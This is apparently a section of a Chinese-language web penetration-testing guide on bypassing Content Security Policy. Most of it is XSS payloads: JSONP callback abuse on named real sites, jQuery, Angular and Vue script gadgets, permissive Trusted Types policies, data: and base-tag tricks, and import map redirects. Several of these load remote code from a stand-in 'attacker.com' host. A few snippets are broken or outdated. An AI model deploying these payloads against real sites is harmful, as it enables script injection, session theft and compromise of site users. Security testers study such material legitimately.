## 四、CSP高级绕过（script gadget/JSONP/strict-dynamic/Trusted Types对抗）

### 4.1 CSP指令检测与分析
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```
关键指令：`script-src`、`object-src`、`base-uri`、`style-src`、`img-src`、`frame-src`、`connect-src`、`report-uri`、`require-trusted-types-for`、`trusted-types`
**审计要点：**
- `script-src` 是否含 `'unsafe-inline'` / `'unsafe-eval'` / `'strict-dynamic'` / `data:` / 通配符域名
- `base-uri` 缺失 → 可通过 `<base>` 标签劫持相对路径脚本加载
- `object-src` 缺失 → `<object>/<embed>` 加载恶意插件/HTML
- `trusted-types` 策略名是否可预测（可通过DOM clobbering或宽松策略绕过）

### 4.2 常见unsafe-inline/dynamic绕过
```javascript
// unsafe-inline允许的场景
<script>alert(1)</script>   // script-src含'unsafe-inline'

// unsafe-eval
eval('alert(1)')
new Function('alert(1)')()
setTimeout('alert(1)',0)
setInterval('alert(1)',0)

// strict-dynamic绕过（允许script标签中动态创建的脚本加载）
// 只要有合法脚本执行，即可用createElement动态加载任意脚本
<script src=//attacker.com/x.js></script>
```

### 4.3 JSONP端点绕过CSP
```javascript
// 若script-src为'self'，寻找同源JSONP端点
<script src="/api/jsonp?callback=alert"></script>
// 典型JSONP可利用端点
<script src="https://target.com/xxx?callback=alert"></script>
// 利用JSONP反射XSS
<script src="/jsonp?cb=%3C/script%3E%3Csvg%20onload=alert(1)%3E"></script>

// 知名站点JSONP端点
// 用于script-src白名单包含这些CDN/站点时
<script src="https://www.google.com/jsapi?callback=alert"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
<script src="https://www.youtube.com/oembed?url=x&callback=alert"></script>
```

### 4.4 Script Gadget链（2026年主流CSP绕过）
**核心概念**：利用页面已存在的合法JS库/代码片段作为"gadget"，注入看似无害的HTML元素触发库代码将属性值转化为可执行代码。Google CCS论文实测：16个主流框架中13个可绕过strict-dynamic CSP，DOMPurify/Closure等消毒器同样被绕过。

```javascript
// jQuery data-text gadget（经典）
// 注入无害HTML，jQuery库自动将其data-text属性值渲染为HTML
<div data-role="button" data-text="<img src=x onerror=alert(1)>"></div>
<script>var buttons = $("[data-role=button]"); buttons.html(button.getAttribute("data-text"));</script>

// Angular表达式gadget（配合注入的class/属性）
<div ng-app ng-csp><div ng-bind="constructor.constructor('alert(1)')()"></div></div>

// Vue数据绑定gadget
<div id=x v-html="'<img src=x onerror=alert(1)>'"></div>

// 通用gadget审计思路：
// 1. 枚举页面加载的JS库与版本
// 2. 查找读取DOM属性/选择器的代码（data-*、class、id选择器）
// 3. 注入无害标记匹配gadget选择器
// 4. 验证属性值是否被写入HTML sink

// 利用polyfill/第三方库
<script src=/js/angular.js></script>  // 配合Angular模板注入
<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.15/lodash.min.js></script>
```

### 4.5 Trusted Types对抗（2026实战）
Trusted Types要求innerHTML/script.src等危险sink必须传入TrustedHTML/TrustedScriptURL对象。绕过路径：

```javascript
// 路径1：策略创建/滥用（MutantBedrog恶意广告实战手法）
// 若站点允许创建任意策略名，直接创建透传策略
if (typeof trustedTypes !== 'undefined') {
  const p = trustedTypes.createPolicy('rp', { createHTML: (input) => input });
  const d = document.createElement('iframe');
  d.setAttribute('srcdoc', p.createHTML('<script>alert(1)<\/script>'));
  document.body.appendChild(d);
}

// 路径2：createScriptURL透传 + 动态script
trustedTypes.createPolicy('my', { createScriptURL: (input) => input });
var s = document.createElement('script');
s.src = trustedTypes.getPolicy('my').createScriptURL('https://attacker.com/x.js');
document.head.appendChild(s);

// 路径3：策略名碰撞/预定义策略劫持
// 若默认策略已存在且宽松（createHTML: s=>s），直接使用
trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>')

// 路径4：DOM clobbering削弱TT检查（CVE-2026-49459同源思路）
// 通过注入的form/name属性覆盖库内部检查引用的属性

// 路径5：绕过TT覆盖的sink
// TT默认只覆盖innerHTML/outerHTML/write/srcdoc/src属性
// location.href、eval、setTimeout(string)等可能未纳入require-trusted-types-for
// 若script-src允许'unsafe-eval'，eval('alert(1)')直接执行

// 检测TT是否生效
if (window.trustedTypes && trustedTypes.createPolicy) { console.log('TT available'); }
```

### 4.6 利用允许的资源加载
```javascript
// 若script-src允许data:
<script src=data:text/javascript,alert(1)></script>
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

// 若script-src允许非安全URL scheme
<script src=javascript:alert(1)></script>

// 若允许unsafe-hashes/nonce/base64
// 需获取nonce值，DOM XSS场景下可读取nonce属性
<script nonce="abc123">alert(1)</script>
```

### 4.7 浏览器缓存/重定向绕过
```javascript
// 利用<meta>刷新
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// 利用<link rel=preload/as=script>预加载后执行
<link rel=preload as=script href=data:,alert(1)>

// base-uri缺失 → 劫持相对路径资源
<base href="https://attacker.com/">
```

### 4.8 新兴CSP绕过面（2025-2026）
- **Import Maps利用**：页面使用`<script type="importmap">`时，注入`"imports": {"vue": "https://attacker.com/vue.js"}`将合法模块导入重定向至恶意URL
- **WASM绕过**：WebAssembly不受script-src内联限制的部分场景，`<script type="module">`+WASM加载
- **CSS注入→XSS**：CSS `@import`/`url()` 联合 `-moz-binding`（老Firefox）或 CSS `expression()`（老IE）；现代浏览器CSS注入主要配合数据窃取（CSS选择器属性值嗅探）
- **Service Worker注册**（需允许的来源）：`navigator.serviceWorker.register('/sw.js')` 后SW缓存/拦截全部请求

### 4.9 CSP绕过辅助工具
- https://csp-evaluator.withgoogle.com/  （CSP策略评估，Google官方）
- https://cspbypass.com/  （CSP绕过payload库）
- Burp CSP Auditor插件
- https://github.com/yetingli/SecLists（CSP绕过wordlist）
- **csp-collector**：收集CSP report endpoint数据

